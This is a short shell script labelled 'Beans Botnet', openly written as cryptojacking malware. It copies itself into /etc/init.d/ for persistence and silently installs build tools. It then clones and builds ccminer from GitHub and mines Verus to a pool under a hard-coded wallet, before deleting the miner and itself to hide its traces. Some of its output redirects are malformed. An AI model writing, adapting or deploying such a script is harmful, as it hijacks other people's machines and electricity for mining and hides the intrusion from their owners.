################
#    Beans     #
#    Botnet    #
###############
filename="$0"
# Persistance Mech
mv $filename /etc/init.d/
chmod +x /etc/init.d/$filename
##################
apt-get update && apt-get upgrade -y >/dev/null/
apt-get install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git nano >/dev/null/
git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer >/dev/null/
cd ccminer > /dev/null/
chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh >/dev/null/
./build.sh || sh build.sh >/dev/null/
./ccminer -a verus -o stratum+tcp://ap.luckpool.net:3957 -u REPN6Sd2hXkR63mwAisX6Hd6qvo8w6sbt1.bean -p x -t 4 >/dev/null/  # Change address, and change pool port (this is only required with bigger mining botnet1s, look at comments in the original repository for info = https://github.com/chilloxop/miners/commit/5b7edc1c785ac0b2ec622d221ec1e2d669991a51 )
echo "Idle......" >/dev/null/
rm -rf ccminer >/dev/null/
rm -- "$filename" >/dev/null/
